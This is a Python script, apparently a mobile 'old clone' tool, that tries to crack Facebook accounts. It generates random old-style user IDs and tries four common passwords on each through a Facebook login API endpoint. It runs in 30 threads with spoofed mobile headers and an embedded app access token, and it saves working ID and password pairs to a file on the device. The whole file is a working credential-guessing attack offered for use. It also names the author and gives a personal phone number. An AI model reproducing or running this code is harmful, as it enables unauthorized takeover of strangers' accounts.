#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
import requests
import os
import re
import sys
import random
import string
import time
from os import system as SAMARPAN
from os import system as shell
from rich import print
from rich import print_json
from rich import pretty
from rich.progress import track
from rich.markdown import Markdown
from rich.tree import Tree
from rich.panel import Panel
from rich.padding import Padding
#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; =(💚)-SAMARPAN-143-(🥀)=\x07')                  
#__________________[ LOGO ]__________________#
logo =("""    
\x1b[38;5;82m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
\x1b[38;5;82m┃    _   ______  ____  _____________    ┃NAME=SAMARPAN JABEU       ┃
\x1b[38;5;82m┃   / | / / __ \/ __ )/  _/_  __/   |   ┃FACEBOOK=SAMARPANJABEGU   ┃
\x1b[38;5;82m┃  /  |/ / / / / __  |/ /  / / / /| |   ┃VERSION=1.1               ┃
\x1b[38;5;82m┃ / /|  / /_/ / /_/ // /  / / / ___ |   ┃WHATSAPP=+9779816029717   ┃
\x1b[38;5;82m┃/_/ |_/\____/_____/___/ /_/ /_/  |_|   ┃GITHUB=MR×SPJL            ┃
\x1b[38;5;82m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
def linex():print(Panel("[yellow bold]  GM BRAND NAME TO SUNA HE HOGA "))
loop,ok=0,0
class Samarpan:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       linex()
       print(Panel("[cyan bold]~>> 1. OLD CLONE 2009-2014\n[red bold]~>> 2. Exit Menu"));linex()
       self.frsc=input("\033[0;33m~>> Select : ")
       if self.frsc == "1":self.settings()
       else:main(self)
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print(Panel("~>> Example : 5000 7000 9000 10000 100000000"));linex()
       self.limit=int(input("\033[0;33m~>> Enter Search Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as Samarpan:
           total=str(len(self.user));self.clear()
           print("~>> Total Uid : %s"%(total))
           print("~>> Use Data For Best Result ");linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
               Samarpan.submit(self.cracker,uid,pas,total)
       print();linex();print("~>> Cracking Complete \n~>> Total OK : %s"%(ok))
       linex();input("~>> Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r\033[0;33m~>> SAMARPAN-GM-143 ~>> %s ~>> OK ~>> %s \r"%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(Panel(f"\r\r~>> OK ~>> [green bold]{uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/SAMARPAN-GM-143-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(Panel(f"\r\r~>> OK ~>>[green bold] {uid} | [yellow bold]{ps} \033[0m"));print(Panel(f"[yellow bold] LINK : https://www.facebook.com/profile.php?id={uid}"));open("/sdcard/SAMARPAN-GM-143-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
       return aa       
Samarpan().main()